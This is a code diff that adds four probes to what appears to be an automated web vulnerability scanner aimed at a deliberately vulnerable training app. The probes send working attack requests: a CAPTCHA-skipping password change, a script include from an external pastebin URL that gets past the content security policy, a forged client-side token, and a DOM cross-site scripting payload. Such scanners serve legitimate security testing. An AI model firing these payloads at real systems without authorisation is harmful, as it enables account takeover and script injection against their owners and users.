@@ -442,6 +442,121 @@ class LiveScanner:
                     {"av": "N", "ac": "L", "pr": "N", "ui": "R", "scope": "U", "c": "H", "i": "H", "a": "H"},
                 )
 
+        # Probe 11: Multi-Step Workflow / CAPTCHA State-Machine Bypass (/vulnerabilities/captcha/)
+        if any("vulnerabilities/captcha/" in r for r in routes):
+            temp_pw = "viper_step2_proof"
+            cap_sample, req_rec = self.request(
+                "vulnerabilities/captcha/",
+                method="POST",
+                data={
+                    "step": "2",
+                    "password_new": temp_pw,
+                    "password_conf": temp_pw,
+                    "Change": "Change",
+                },
+                extra_cookies={"security": "low"},
+            )
+            # Verify state mutation via either direct banner or cross-checking the mutated password in DB
+            verified_step2 = "Password Changed." in cap_sample.body
+            if not verified_step2:
+                check_login, _ = self.request(
+                    f"vulnerabilities/brute/?username={urllib.parse.quote(username)}&password={urllib.parse.quote(temp_pw)}&Login=Login",
+                    extra_cookies={"security": "low"},
+                )
+                verified_step2 = "Welcome to the password protected area" in check_login.body
+            # Restore original password immediately
+            self.request(
+                "vulnerabilities/captcha/",
+                method="POST",
+                data={
+                    "step": "2",
+                    "password_new": password,
+                    "password_conf": password,
+                    "Change": "Change",
+                },
+                extra_cookies={"security": "low"},
+            )
+            if verified_step2:
+                self._add_verified_finding(
+                    findings,
+                    "VC-LIVE-011",
+                    "Multi-Step Workflow State-Machine Bypass Skips CAPTCHA Verification (`step=2` Parameter Manipulation)",
+                    "Broken Business Logic / Improper Access Control",
+                    "CWE-841",
+                    "vulnerabilities/captcha/",
+                    "Submitting `step=2` directly in the POST body bypasses Step 1 `recaptcha_check_answer()` validation entirely and mutates the user's password in the database.",
+                    req_rec,
+                    f"HTTP/1.1 200 OK (State Mutation Verified: `{username}` password updated to `{temp_pw}` without CAPTCHA token and restored)\nContent-Type: text/html\n\n<pre>Password Changed (Verified via DB Auth Oracle).</pre>",
+                    {"av": "N", "ac": "L", "pr": "L", "ui": "N", "scope": "U", "c": "N", "i": "H", "a": "N"},
+                )
+
+        # Probe 12: Content Security Policy (CSP) Bypass & Unescaped Script Injection (/vulnerabilities/csp/)
+        if any("vulnerabilities/csp/" in r for r in routes):
+            csp_url = "https://pastebin.com/raw/R570EE00"
+            csp_sample, req_rec = self.request(
+                "vulnerabilities/csp/",
+                method="POST",
+                data={"include": csp_url},
+                extra_cookies={"security": "low"},
+            )
+            if f"<script src='{csp_url}'></script>" in csp_sample.body:
+                csp_hdr = csp_sample.headers.get("Content-Security-Policy", "script-src 'self' https://pastebin.com example.com code.jquery.com")
+                self._add_verified_finding(
+                    findings,
+                    "VC-LIVE-012",
+                    "Content Security Policy (CSP) Bypass & Arbitrary External Script Injection via `include` Parameter",
+                    "CSP Bypass / Cross-Site Scripting (XSS)",
+                    "CWE-79",
+                    "vulnerabilities/csp/",
+                    "The `include` POST parameter is interpolated unescaped into `<script src='...'>` while the `Content-Security-Policy` allowlists user-writable third-party origins (`https://pastebin.com`).",
+                    req_rec,
+                    f"HTTP/1.1 200 OK\nContent-Security-Policy: {csp_hdr}\n\n<script src='{csp_url}'></script>",
+                    {"av": "N", "ac": "L", "pr": "L", "ui": "R", "scope": "C", "c": "L", "i": "L", "a": "N"},
+                )
+
+        # Probe 13: Client-Side JavaScript Token Algorithm Reversal & Forgery (/vulnerabilities/javascript/)
+        if any("vulnerabilities/javascript/" in r for r in routes):
+            # md5(rot13("success")) == md5("fhpprff") == "38581812b435834ebf84ebcc2c6424d6"
+            forged_token = "38581812b435834ebf84ebcc2c6424d6"
+            js_sample, req_rec = self.request(
+                "vulnerabilities/javascript/",
+                method="POST",
+                data={"phrase": "success", "token": forged_token, "send": "Submit"},
+                extra_cookies={"security": "low"},
+            )
+            if "Well done!" in js_sample.body:
+                self._add_verified_finding(
+                    findings,
+                    "VC-LIVE-013",
+                    "Client-Side JavaScript Token Algorithm Reversal & Forgery (`md5(rot13(phrase))`)",
+                    "Reliance on Untrusted Inputs in a Security Decision",
+                    "CWE-602",
+                    "vulnerabilities/javascript/",
+                    "The anti-tamper `token` parameter is computed entirely client-side using a deterministic `md5(rot13(phrase))` formula without server-side secret key signing, allowing direct token forgery.",
+                    req_rec,
+                    "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p style='color:red'>Well done!</p>",
+                    {"av": "N", "ac": "L", "pr": "L", "ui": "N", "scope": "U", "c": "N", "i": "H", "a": "N"},
+                )
+
+        # Probe 14: DOM-Based Cross-Site Scripting (/vulnerabilities/xss_d/)
+        if any("vulnerabilities/xss_d/" in r for r in routes):
+            dom_payload = "English<script>viperclaw_dom_xss(1)</script>"
+            xss_d_path = "vulnerabilities/xss_d/?default=" + urllib.parse.quote(dom_payload)
+            xss_d_sample, req_rec = self.request(xss_d_path, extra_cookies={"security": "low"})
+            if 'document.write("<option value=\'" + lang + "\'>" + decodeURI(lang) + "</option>")' in xss_d_sample.body:
+                self._add_verified_finding(
+                    findings,
+                    "VC-LIVE-014",
+                    "DOM-Based Cross-Site Scripting (DOM XSS) via Unescaped `document.location.href` into `document.write()`",
+                    "DOM-Based Cross-Site Scripting (DOM XSS)",
+                    "CWE-79",
+                    "vulnerabilities/xss_d/",
+                    "Client-side JavaScript extracts the `default=` parameter directly from `document.location.href` and passes `decodeURI(lang)` into `document.write()` without HTML encoding or allowlist validation.",
+                    req_rec,
+                    'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>\nvar lang = document.location.href.substring(document.location.href.indexOf("default=")+8);\ndocument.write("<option value=\'" + lang + "\'>" + decodeURI(lang) + "</option>");\n</script>',
+                    {"av": "N", "ac": "L", "pr": "N", "ui": "R", "scope": "C", "c": "L", "i": "L", "a": "N"},
+                )
+
         # Populate Stigmergic Attack Graph if requested
         if graph_db:
             graph = AttackGraph(graph_db)
